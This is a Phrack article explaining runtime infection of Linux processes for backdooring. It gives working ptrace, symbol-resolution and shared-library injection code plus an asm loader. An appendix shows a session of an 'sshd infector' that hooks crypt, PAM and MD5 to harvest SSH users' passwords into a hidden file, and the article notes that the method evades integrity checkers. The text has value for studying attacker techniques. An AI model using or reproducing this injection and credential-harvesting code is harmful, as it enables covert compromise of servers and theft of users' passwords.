                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3b, Phile #0x08 of 0x12

|=--------------------=[ Runtime Process Infection ]=--------------------=|
|=-----------------------------------------------------------------------=|
|=---------------=[ anonymous <p59_08@author.phrack.org> ]=--------------=|

--[ Contents

  1 - Introduction
  2 - ptrace() - Linux debugging API
  3 - resolving symbols
  4 - plain asm code injection - old fashioned way
  5 - .so injection - easy way
  6 - A brief note about shared lib redirection
  7 - Conclusion

  8 - References

  A - Appendix - sshfucker: runtime sshd infector


--[ 1 - Introduction

The purpose of this article is to introduce a couple of methods for
infecting binaries on runtime, and even though there are many other
possible areas of use for this technique, we will mainly focus on a bit
more evil things, such as backdooring binaries. However, this is not
supposed to be ELF tutorial nor guide to linking. The reader is assumed to
be somewhat familiar with ELF. Also, this article is strictly x86 linux
specified, even though the same techniques and methods could be easily
ported to other platforms as well.


--[ 2 - ptrace() - Linux debugging API

Linux offers one simple function for playing with processes, and it can do
pretty much everything we need to do. We will not take a more indepth look
at ptrace() here, since its quite simple and pretty much all we need to
know can be found on the man page. However we will introduce a couple of
helper functions to make working with ptrace() easier.


/* attach to pid */

	void
	ptrace_attach(int pid)
	{
		if((ptrace(PTRACE_ATTACH , pid , NULL , NULL)) < 0) {
			perror("ptrace_attach");
			exit(-1);
		}

		waitpid(pid , NULL , WUNTRACED);
	}


/* continue execution */

	void
	ptrace_cont(int pid)
	{
		if((ptrace(PTRACE_CONT , pid , NULL , NULL)) < 0) {
			perror("ptrace_cont");
			exit(-1);
		}

		while (!WIFSTOPPED(s)) waitpid(pid , &s , WNOHANG);
	}


/* detach process */

	void
	ptrace_detach(int pid)
	{
		if(ptrace(PTRACE_DETACH, pid , NULL , NULL) < 0) {
			perror("ptrace_detach");
			exit(-1);
		}
	}

/* read data from location addr */

	void *
	read_data(int pid ,unsigned long addr ,void *vptr ,int len)
	{
		int i , count;
		long word;
		unsigned long *ptr = (unsigned long *) vptr;

		count = i = 0;
		
		while (count < len) {
			word = ptrace(PTRACE_PEEKTEXT ,pid ,addr+count, \
NULL);
			count += 4;
			ptr[i++] = word;
		}
	}


/* write data to location addr */	

	void
	write_data(int pid ,unsigned long addr ,void *vptr,int len)
	{
        	int i , count;
        	long word;

		i = count = 0;

		while (count < len) {
			memcpy(&word , vptr+count , sizeof(word));
			word = ptrace(PTRACE_POKETEXT, pid , \
				addr+count , word);
			count +=4;
		}
	}


--[ 3 - resolving symbols

As long as we are planning any kind of function intercepting/modifying, we
need ways to locate some certain functions in the binary. For now we are
gonna use link-map for that. link_map is dynamic linkers internal structure
with which it keeps track of loaded libraries and symbols within libraries.
Basicly link-map is a linked list, each item on list having a pointer to
loaded library. Just like dynamic linker does when it needs to find symbol,
we can travel this list back and forth, go through each library on the list
to find our symbol. the link-map can be found on the second entry of GOT
(global offset table) of each object file. It is no problem for us to read
link-map node address from the GOT[1] and start following linkmap nodes
until the symbol we wanted has been found.

from link.h:

	struct link_map
	{
	    ElfW(Addr) l_addr;  /* Base address shared object is loaded */
	    char *l_name;  /* Absolute file name object was found in.  */
	    ElfW(Dyn) *l_ld;  /* Dynamic section of the shared object.  */
	    struct link_map *l_next, *l_prev; /* Chain of loaded objects.*/
	};


The structure is quite self-explaining, but here is a short explanation of
all items anyway:

l_addr: Base address where shared object is loaded. This value can also be
	found from /proc/<pid>/maps

l_name: pointer to library name in string table

l_ld: pointer to dynamic (DT_*) sections of shared lib

l_next: pointer to next link_map node

l_prev: pointer to previous link_map node


The idea for symbol resolving with the link_map struct is simple. We
traverse throu link_map list, comparing each l_name item until the library
where our symbol is supposed to reside is found. Then we move to l_ld
struct and traverse throu dynamic sections until DT_SYMTAB and DT_STRTAB
have been found, and finally we can seek our symbol from DT_SYMTAB. This
can be quite slow, but should be fine for our example. Using HASH table for
symbol lookup would be faster and preferred, but that is left as exercise
for the reader ;D.

Let's look at some of the functions making life more easy with the
link_map. The below code is based on grugq's code on  his ml post[1], altered
to use ptrace() for resolving in another process address space:


/* locate link-map in pid's memory */

struct link_map *
locate_linkmap(int pid)
{
	Elf32_Ehdr      *ehdr   = malloc(sizeof(Elf32_Ehdr));
	Elf32_Phdr      *phdr   = malloc(sizeof(Elf32_Phdr));
	Elf32_Dyn       *dyn    = malloc(sizeof(Elf32_Dyn));
	Elf32_Word      got;
	struct link_map *l      = malloc(sizeof(struct link_map));
	unsigned long   phdr_addr , dyn_addr , map_addr;


	/* first we check from elf header, mapped at 0x08048000, the offset
	 * to the program header table from where we try to locate
	 * PT_DYNAMIC section.
	 */

	read_data(pid , 0x08048000 , ehdr , sizeof(Elf32_Ehdr));

	phdr_addr = 0x08048000 + ehdr->e_phoff;
	printf("program header at %p\n", phdr_addr);

	read_data(pid , phdr_addr, phdr , sizeof(Elf32_Phdr));

	while ( phdr->p_type != PT_DYNAMIC ) {
		read_data(pid, phdr_addr += sizeof(Elf32_Phdr), phdr, \
			sizeof(Elf32_Phdr));
	}

	/* now go through dynamic section until we find address of the GOT
	 */

	read_data(pid, phdr->p_vaddr, dyn, sizeof(Elf32_Dyn));
	dyn_addr = phdr->p_vaddr;

	while ( dyn->d_tag != DT_PLTGOT ) {
		read_data(pid, dyn_addr += sizeof(Elf32_Dyn), dyn,\ 
			sizeof(Elf32_Dyn));
	}

	got = (Elf32_Word) dyn->d_un.d_ptr;
	got += 4; 		/* second GOT entry, remember? */

	/* now just read first link_map item and return it */
	read_data(pid, (unsigned long) got, &map_addr , 4);
	read_data(pid , map_addr, l , sizeof(struct link_map));

	free(phdr);
	free(ehdr);
	free(dyn);

	return l;
}

/* search locations of DT_SYMTAB and DT_STRTAB and save them into global
 * variables, also save the nchains from hash table.
 */


unsigned long   symtab;
unsigned long   strtab;
int             nchains;


void
resolv_tables(int pid , struct link_map *map)
{
	Elf32_Dyn       *dyn    = malloc(sizeof(Elf32_Dyn));
	unsigned long   addr;

	addr = (unsigned long) map->l_ld;

	read_data(pid , addr, dyn, sizeof(Elf32_Dyn));

	while ( dyn->d_tag ) {
		switch ( dyn->d_tag ) {

			case DT_HASH:
				read_data(pid,dyn->d_un.d_ptr +\
					map->l_addr+4,\
					&nchains , sizeof(nchains));
				break;

			case DT_STRTAB:
				strtab = dyn->d_un.d_ptr;
				break;

			case DT_SYMTAB:
				symtab = dyn->d_un.d_ptr;
				break;

			default:
				break;
		}

		addr += sizeof(Elf32_Dyn);
		read_data(pid, addr , dyn , sizeof(Elf32_Dyn));
	}

	free(dyn);
}

/* find symbol in DT_SYMTAB */

unsigned long
find_sym_in_tables(int pid, struct link_map *map , char *sym_name)
{
	Elf32_Sym       *sym = malloc(sizeof(Elf32_Sym));
	char            *str;
	int             i;

	i = 0;

	while (i < nchains) {
		read_data(pid, symtab+(i*sizeof(Elf32_Sym)), sym,
			sizeof(Elf32_Sym));
		i++;

		if (ELF32_ST_TYPE(sym->st_info) != STT_FUNC) continue;

		/* read symbol name from the string table */
		str = read_str(pid, strtab + sym->st_name);

		if(strncmp(str , sym_name , strlen(sym_name)) == 0)
			return(map->l_addr+sym->st_value);
	}

	/* no symbol found, return 0 */
	return 0;
}

We use nchains (number of items in chain array) stored from DT_HASH to
check how many symbols each lib has so we know where to stop reading in
case the wanted symbol is not found.


--[ 4 - plain asm code injection - old fashioned way

We are gonna skip this part because of lack of time and interest. Simple
pure-asm code injectors have been around for quite sometime already, and
techniq is probably already clear, since it just really is poking opcodes
into process memory, overwriting old data, allocating space with sbrk() or
finding space otherwhere for own code. However, there is another method
with which you do not have to worry about finding space for your code
(atleast when playing with dynamically linked binaries) and we are coming
to it next.


--[ 5 - .so injection - easy way

Instead of injecting pure asm code we could force the process to load our
shared library and let the runtime dynamic linker to do all dirty work for
us. Benefits of this is the simplicity, we can write the whole .so with
pure C and call external symbols. libdl offers a programming interface to
dynamic linking loader, but a quick look to libdl sources show us that
dlopen() , dlsym() and dlclose() are quite much just wrapper functions with
some extra error checking, while the real functions are residing in libc.
here's the prototype to _dl_open() from glibc-2.2.4/elf/dl-open.c:

	void *
	internal_function
	_dl_open (const char *file, int mode, const void *caller);

Parameters are pretty much the same as in dlopen(), having only one 'extra'
parameter *caller, which is pointer to calling routine and its not really
important to us and we can safely ignore it. We will not need other dl*
functions now either.

So, we know which function we can be used to load our shared library, and
now we could write a small asm code snippet which calls _dl_open() and
loads our lib and thats exactly what we are gonna do. One thing to remember
is that _dl_open() is defined as an 'internal_function', which means the
function parameters are passed in slightly different way, via registers
instead of stack. See the parameters order here:

	EAX = const char *file
	ECX = const void *caller (we set it to NULL)
	EDX = int mode (RTLD_LAZY)


Asset with this information, we will introduce our tiny .so loader code:

	_start:	jmp string

	begin:	pop 	eax			; char *file
		xor	ecx	,ecx		; *caller
		mov 	edx	,0x1		; int mode

		mov	ebx,	0x12345678	; addr of _dl_open()
		call	ebx			; call _dl_open!
		add	esp,	0x4

		int3				; breakpoint


	string: call begin
		db "/tmp/ourlibby.so",0x00


With good'old aleph1-style trick we make our loader position independent
(well it actually does not have to be, since we can place it anywhere we
want to). We also place int3 after 'call' so process stops execution there
and we can overwrite our loader with backed up, orginal code again.
_dl_open()  address is not known yet, but we can easily patch it into code
afterwards.

  A cleaner way would be getting the registers with ptrace(pid,
PTRACE_GETREGS,...) and write the parameters to user_regs_struct structure,
store libpath string in the stack and inject plain int 0x80 and int3, but
it is really just a matter of taste and lazyness how you do this. About
.so injection, this obviously will not work with staticly compiled binaries
since static binaries do not even have dynamic linker loaded. For such
binaries one has to think of something else, maybe plain-asm code injection
or something. Another disadvantage of injecting shared objects is that it
can be easily noticed by peeking into /proc/<pid>/maps. Though one can use
lkm's / kmem patching to hide them, or maybe infecting existing already
loaded libs with new symbols and then forcing to reload them. However, if
anyone has good ideas how to solve these problems, I would like to hear
about them.


--[ 6 - A brief note about shared lib redirection

For runtime infection, function redirection is prolly the most obvious
thing to do. Like Silvio Cesare showed us on his paper [2], PLT (Procedure
Linkage Table) is prolly the cleanest and easiest way to do this. Getting
our hands on executable's PLT via the linkmap is easy, the very first node
of the link_map list has pointers to executables dynamic sections, and from
there we can look for DT_SYMTAB section (just as we do with all objects),
executables DT_SYMTAB entries are in fact part of the PLT. Redirection is
done by placing jumps into the corresponding function entries on the PLT,
to our functions in .so what we loaded.


--[ 7 - Conclusion

Runtime infection is a quite interesting technique indeed. It does not only
pass pax, openwall and other such kernel patches, but tripwire and other
file integrity checkers as well. As a demonstration of runtime infection
abilities I have included little sshd-infector at the end of this article.
It is capable of snooping crypt(), PAM and md5 passwords of users logged
via sshd. See Appendix A.


--[ 8 - References
   
[1] More elf buggery, bugtraq post, by grugq 
    http://online.securityfocus.com/archive/1/274283/2002-07-10/2002-07-16/2

[2] Shared lib redirection by Silvio Cesare
    http://www.big.net.au/~silvio/lib-redirection.txt

    Subversive Dynamic Linking, by grugq
    http://online.securityfocus.com/data/library/subversiveld.pdf

    Shaun Clowes's Blackhat 2001 presentation slides
    http://www.blackhat.com/presentations/bh-europe-01/shaun-clowes/injectso3.ppt

    Tool Interface Standard (TIS) Executable and Linking Format Specification
    http://x86.ddj.com/ftp/manuals/tools/elf.pdf

    ptrace(2) man page
    http://www.die.net/doc/linux/man/man2/ptrace.2.html


--[ Appendix A - sshfucker: runtime sshd infector

     sshf typescript:

root@:/tmp> tar zxvf sshf.tgz
sshf/
sshf/sshf.c
sshf/evilsshd.c
sshf/Makefile.in
sshf/config.h.in
sshf/configure
root@:/tmp> cd sshf
root@:/tmp/sshf> ./configure ; make
checking for gcc... gcc
checking for C compiler default output... a.out
checking whether the C compiler works... yes
checking whether we are cross compiling... no
checking for executable suffix...
checking for object suffix... o
checking whether we are using the GNU C compiler... yes
checking whether gcc accepts -g... yes
checking for pam_start in -lpam... yes
checking for MD5_Update in -lcrypto... yes
configure: creating ./config.status
config.status: creating Makefile
config.status: creating config.h
gcc -w -fPIC -shared -o evilsshd.so evilsshd.c -lcrypt -lcrypto -lpam  
-DHAVE_CONFIG_H
gcc -w -o sshf sshf.c
root@:/tmp/sshf> ps auwx | grep sshd
root      9597  0.0  0.3  2840 1312 ?        S    03:04   0:00 sshd
root@:/tmp/sshf>
root@:/tmp/sshf> ./sshf 9597 /tmp/sshf/evilsshd.so
attached to pid 9597
_dl_open at 0x4023014c
stopped 9597 at 0x402017ee
jam! if it jams here, try to telnet into sshd port or smthing
lib injection done!
org crypt() at 0x804b860, evil crypt at 0x40265d60
org getspnam at 0x804afa0, evil getspnam at 0x40265e0c
org strncmp() at 0x804b8f0, evil strncmp() at 0x40265a84
org MD5_Update() at 0x804bdf0, evil MD5Update at 0x40265aec
all done, now quiting...
root@:/tmp/sshf>
root@:/tmp/sshf> ssh -l luser 127.0.0.1
luser@127.0.0.1's password:
[luser@localhost:~>ls -al /tmp/.sshd_passwordz
-rw-r--r--    1 root     root          104 Jul 14 03:27 
/tmp/.sshd_passwordz
[luser@localhost:~>exit

Enjoy.

 

